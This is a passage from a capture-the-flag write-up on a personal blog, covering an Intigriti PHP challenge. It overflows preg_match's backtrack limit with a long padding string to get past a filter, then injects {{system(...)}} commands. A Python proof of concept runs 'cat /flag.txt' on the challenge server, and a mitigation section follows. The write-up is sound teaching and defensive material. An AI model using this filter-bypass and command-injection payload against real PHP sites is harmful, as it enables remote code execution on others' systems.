It seems complicated, so let&rsquo;s go and visualize it on <a href=https://regex101.com/ target=_blank>regex101</a> using the debugger.</p><p>Ok, let&rsquo;s craft something evil now.<br>We need at least 100k iterations. Easy. Let&rsquo;s fill the payload with <code>'X'*100_000</code>&mldr; buuut it&rsquo;s not working.<br>Why?<br>Well, in regex terms, we&rsquo;re not actually doing 100k &ldquo;recursions&rdquo;, but instead we&rsquo;re counting &ldquo;backtracking steps&rdquo;, which as the <a href=https://www.php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit target=_blank>PHP documentation</a> states it defaults to 1_000_000 (1M) in the <code>pcre.backtrack_limit</code> variable.<br>To reach that, <code>'X'*500_001</code> will result in 1 million backtracking steps (500k forward and 500k backwards).</p><p>Let&rsquo;s try.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;@dimariasimone on</span><span class=si>{</span><span class=s1>&#39;X&#39;</span><span class=o>*</span><span class=mi>500_001</span><span class=si>}</span><span class=s2> </span><span class=se>{{</span><span class=s2>system(&#39;id&#39;)</span><span class=se>}}</span><span class=s2>&#34;</span>
</span></span></code></pre></div><p><figure><img class="my-0 rounded-md" loading=lazy src=./img/payloadworks.png alt></figure></p><p>Profit!</p><h3 class="relative group">2.2) PoC<div id=22-poc class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#22-poc aria-label=Anchor>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>URL</span> <span class=o>=</span> <span class=s1>&#39;https://challenge-1223.intigriti.io/challenge.php&#39;</span>
</span></span><span class=line><span class=cl><span class=n>data</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;data&#39;</span><span class=p>:</span><span class=sa>f</span><span class=s2>&#34;@dimariasimone on</span><span class=si>{</span><span class=s1>&#39;X&#39;</span><span class=o>*</span><span class=mi>500_001</span><span class=si>}</span><span class=s2> </span><span class=se>{{</span><span class=s2>system(&#39;cat /flag.txt&#39;)</span><span class=se>}}</span><span class=s2>&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=c1>#print(data)</span>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>URL</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>)[</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span>
</span></span></code></pre></div><p>Flag: <code>INTIGRITI{7h3_fl46_l457_71m3_w45_50_1r0n1c!}</code></p><hr><h2 class="relative group">3. Mitigation<div id=3-mitigation class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#3-mitigation aria-label=Anchor>#</a></span></h2><p>To mitigate the issue, we have some work to do.<br>A solution could be to avoid using PHP altogether, but I understand that some people may be fond of it :/</p><p>Here are some mitigation steps:</p><ul><li>Under PHP, this maximum recursion depth is specified with the <code>pcre.recursion_limit</code> configuration variable and (unfortunately) the default value is set to 100,000. <strong>This value is TOO BIG!</strong> Here is a table of safe values of <code>pcre.recursion_limit</code> for a variety of executable stack sizes:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>Stacksize</span>   <span class=nx>pcre</span><span class=o>.</span><span class=nx>recursion_limit</span>
</span></span><span class=line><span class=cl> <span class=mi>64</span> <span class=nx>MB</span>      <span class=mi>134217</span>
</span></span><span class=line><span class=cl> <span class=mi>32</span> <span class=nx>MB</span>      <span class=mi>67108</span>
</span></span><span class=line><span class=cl> <span class=mi>16</span> <span class=nx>MB</span>      <span class=mi>33554</span>
</span></span><span class=line><span class=cl>  <span class=mi>8</span> <span class=nx>MB</span>      <span class=mi>16777</span>
</span></span><span class=line><span class=cl>  <span class=mi>4</span> <span class=nx>MB</span>      <span class=mi>8388</span>
</span></span><span class=line><span class=cl>  <span class=mi>2</span> <span class=nx>MB</span>      <span class=mi>4194</span>
</span></span><span class=line><span class=cl>  <span class=mi>1</span> <span class=nx>MB</span>      <span class=mi>2097</span>
</span></span><span class=line><span class=cl><span class=mi>512</span> <span class=nx>KB</span>      <span class=mi>1048</span>
</span></span><span class=line><span class=cl><span class=mi>256</span> <span class=nx>KB</span>      <span class=mi>524</span>
</span></span></code></pre></div><ul><li>Since <code>preg_match()</code> returns <code>false</code> on failure and <code>1</code> and <code>0</code> respectively if the match was successful and if not, we should do some strict type checking.</li></ul><p><figure><img class="my-0 rounded-md" loading=lazy src=./img/possiblefix.png alt></figure></p><p>NOTE: this is just a quick fix in the challenge context, generally speaking using the <a href=https://www.php.net/manual/en/function.preg-last-error.php target=_blank><code>preg_last_error()</code></a> function and defining behaviours for each case is a better solution.</p><ul><li>Use regex timeouts: Set a maximum execution time or timeout for regex pattern matching.</li><li>Use alternatives to regular expressions, such as string manipulation functions or parsing libraries.</li></ul><p><figure><img class="my-0 rounded-md" loading=lazy src=./img/car-driving-car.gif alt="My job here is done"><figcaption>My job here is done</figcaption></figure></p></div></div><script>var oid="views_posts/Intigriti-challenges/1223/index.md",oid_likes="likes_posts/Intigriti-challenges/1223/index.md"</script><script type=text/javascript src=/js/page.min.0860cf4e04fa2d72cc33ddba263083464d48f67de06114529043cb4623319efed4f484fd7f1730df5abea0e2da6f3538855634081d02f2d6e920b956f063e823.js integrity="sha512-CGDPTgT6LXLMM926JjCDRk1I9n3gYRRSkEPLRiMxnv7U9IT9fxcw31q+oOLabzU4hVY0CB0C8tbpILlW8GPoIw=="></script></section><footer class="pt-8 max-w-prose print:hidden"><div class=pt-8><hr class="border-dotted border-neutral-300 dark:border-neutral-600"><div class="flex justify-between pt-3"><span><a class="flex group mr-3" href=/posts/htb-university-ctf-2023/windowsofopportunity/><span class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400">&larr;</span>
<span class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400">&rarr;</span>
<span class="flex flex-col"><span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500">HackTheBox University CTF 2023 - WindowsOfOpportunity</span>
<span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400"><time datetime=2023-10-26T00:00:00+01:00>26 October 2023</time>
</span></span></a></span><span><a class="flex text-right group ml-3" href=/posts/moca-ctf-quals-2024/raas/><span class="flex flex-col"><span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500">MOCA CTF 2024 Quals - RaaS</span>
<span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400"><time datetime=2024-07-20T00:00:00+01:00>20 July 2024</time>
</span></span><span class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400">&rarr;</span>
<span class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400">&larr;</span></a></span></div></div></footer></article><div id=top-scroller class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0"><a href=#the-top class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400" aria-label="Scroll to top" title="Scroll to top">&uarr;</a></div></main><footer id=site-footer class="py-10 print:hidden"><nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400"><ul class="flex flex-col list-none sm:flex-row"><li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href=/tags/ title=Tags>Tags</a></li></ul></nav><div class="flex items-center justify-between"><p class="text-sm text-neutral-500 dark:text-neutral-400">&copy;
2025
simonedimaria</p><p class="text-xs text-neutral-500 dark:text-neutral-400">Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://gohugo.io/ target=_blank rel="noopener noreferrer">Hugo</a> & <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://blowfish.page/ target=_blank rel="noopener noreferrer">Blowfish</a></p></div><script>mediumZoom(document.querySelectorAll("img:not(.nozoom)"),{margin:24,background:"rgba(0,0,0,0.5)",scrollOffset:0})</script><script type=text/javascript src=/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh+sCQ0E53ghYrxgYqw+0GCRyIEpA=="></script></footer><div id=search-wrapper class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]" data-url=https://simonedimaria.github.io/ style=z-index:500><div id=search-modal class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"><header class="relative z-10 flex items-center justify-between flex-none px-2"><form class="flex items-center flex-auto min-w-0"><div class="flex items-center justify-center w-8 h-8 text-neutral-400"><span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentcolor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></div><input type=search id=search-query class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent" placeholder=Search tabindex=0></form><button id=close-search-button class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400" title="Close (Esc)">
<span class="relative block icon"><svg viewBox="0 0 320 512"><path fill="currentcolor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></button></header><section class="flex-auto px-2 overflow-auto"><ul id=search-results></ul></section></div></div></div></body></html>